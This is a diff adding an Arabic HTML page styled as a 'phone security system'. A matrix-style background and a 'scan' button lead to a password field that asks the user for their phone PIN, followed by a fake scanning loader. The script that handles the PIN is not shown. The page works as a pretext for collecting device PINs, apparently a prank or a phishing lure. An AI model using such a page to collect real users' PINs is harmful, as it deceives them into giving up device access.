@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>نظام حماية الهاتف</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="matrix"></div>
+
+<div class="container">
+    <h1>🔐 نظام تأمين الهاتف</h1>
+    <p id="status">اضغط لبدء فحص الحماية</p>
+
+    <button id="startBtn">ابدأ الفحص</button>
+
+    <div id="step1" class="hidden">
+        <input type="password" id="pin" placeholder="أدخل PIN الهاتف">
+        <button onclick="checkPin()">تأكيد</button>
+    </div>
+
+    <div id="loader" class="hidden">
+        <p>جاري فحص الحماية...</p>
+        <div class="loading"></div>
+    </div>
+
+    <div id="result" class="hidden"></div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
